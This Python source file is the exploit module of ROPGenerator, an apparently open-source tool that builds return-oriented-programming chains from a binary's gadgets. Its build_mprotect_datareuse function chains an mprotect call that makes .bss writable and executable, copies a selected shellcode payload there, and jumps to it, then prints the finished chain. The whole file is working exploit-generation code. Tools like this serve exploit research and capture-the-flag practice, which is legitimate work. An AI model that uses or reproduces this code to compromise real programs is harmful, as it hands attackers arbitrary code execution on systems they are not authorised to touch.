# ROPGenerator - Exploit module 
# Building exploits for a binary :D !!
import ropgenerator.Context as Context
import ropgenerator.BinaryScanner as BinaryScanner
import ropgenerator.Analysis as Analysis
from ropgenerator.exploit.mprotect import mprotect_X64
from ropgenerator.payload.Shellcode import selected
from ropgenerator.SearchEngine import search
from ropgenerator.Gadget import GadgetType
from ropgenerator.Constraints import Constraint, ConstraintType 
import ropgenerator.SearchHelper as SearchHelper
import ropgenerator.Database as Database
from ropgenerator.Colors import info, string_bold, string_special, string_exploit, info_colored, notify


def print_exploit(exploit):
    """
    Exploit format is a list of pairs (ropchain, description)
    """
    print(string_bold("\n\tBuilt exploit\n"))
    for (chain, info) in exploit:
        print(string_bold("\t"+'-'*len(info)))
        print(string_exploit('\t'+info))
        print(string_bold("\t"+'-'*len(info)))
        for gadget_num in chain:
            if( SearchHelper.is_padding(gadget_num)):
                padding_str = string_special('0x'+format(SearchHelper.get_padding_unit(gadget_num), '0'+str(Analysis.ArchInfo.bits/4)+'x'))
                if( gadget_num == SearchHelper.DEFAULT_PADDING_UNIT_INDEX ):
                    padding_str += " (Padding)"
                elif( SearchHelper.get_padding_unit(gadget_num) in SearchHelper.addr_to_gadgetStr ):
                    padding_str += " ("+SearchHelper.addr_to_gadgetStr[SearchHelper.get_padding_unit(gadget_num)]+")"
                else:
                    padding_str += " (Custom Padding)"
                print("\t"+padding_str)
            else:
                print("\t"+string_special(Database.gadgetDB[gadget_num].addrStr) + " (" + string_bold(Database.gadgetDB[gadget_num].asmStr) + ")")


def exploit(args):
    build_exploit()
    
# Build an exploit 
def build_exploit():
    
    # get the shellcode 
    (payload, payload_info ) = selected(Analysis.ArchInfo.currentArch)
    if( not payload):
        print(string_bold("\tError, no payload selected :/ "))
        return 
        
    # Check context
    Context.check_context()
    
    # Build exploit
    exploit = build_mprotect_datareuse(payload)
    if( exploit ):
        print_exploit(exploit)
    else:
        print(string_bold("\n\tFailed to build exploit"))


def build_mprotect_datareuse(payload):
    """
    Build a ROPchain that does :
        - mprotect RWX to a static memory area
        - copy payload to this memory area
        - jmp to payload 
    """
    info_colored(string_bold('Building mprotect + datareuse exploit\n'))
    
    # Get the initial constraint 
    constraint = Constraint().add(ConstraintType.BAD_BYTES, Context.bad_bytes())
    
    # Then get address of the bss
    notify('Getting .bss address')
    bss_addr = BinaryScanner.bss_address()
    if( not bss_addr ):
        info("Could not find static .bss section to copy payload to")
        return []
    else:
        info("Found .bss at address: "+hex(bss_addr))
    
    # Then get the mprotect chain
    notify('Building mprotect ropchain to make .bss RWX')   
    if( Analysis.ArchInfo.currentArch == "X86-64" ):
        mprotect_chain = mprotect_X64(bss_addr, len(payload)+1, 7)
    else:
        info("mprotect chain for arch '{}' not supported yet".format(Analysis.ArchInfo.currentArch))
        return []
    if( not mprotect_chain ):
        info("Could not build mprotect chain")
        return []
    mprotect_info = "Create RWX memory : calling mprotect({},{},{})".format(hex(bss_addr), len(payload)+1,7) 
    
    # Then write shellcode in memory 
    notify('Building data-reuse chain to copy payload into .bss') 
    datareuse = search.str_to_mem(bss_addr, '.bss', payload, constraint, hex_info=True)
    if( not datareuse ):
        info("Could not build datareuse chain")
        return []
    datareuse_info = "Copy payload into custom RWX memory"
    
    notify('Building a chain to jump to .bss and execute payload')
    # Then jump to the payload
    ip_num = Analysis.regNamesTable[Analysis.ArchInfo.ip]
    jmp_payload = search.jmp_addr(bss_addr, constraint)
    if( not jmp_payload ):
        info("Could not build jmp_payload chain")
        return []
    jmp_payload_info = "Jump to payload"
    # Concatenate to full exploit
    return [[mprotect_chain,mprotect_info],[datareuse,datareuse_info],[jmp_payload, jmp_payload_info]]
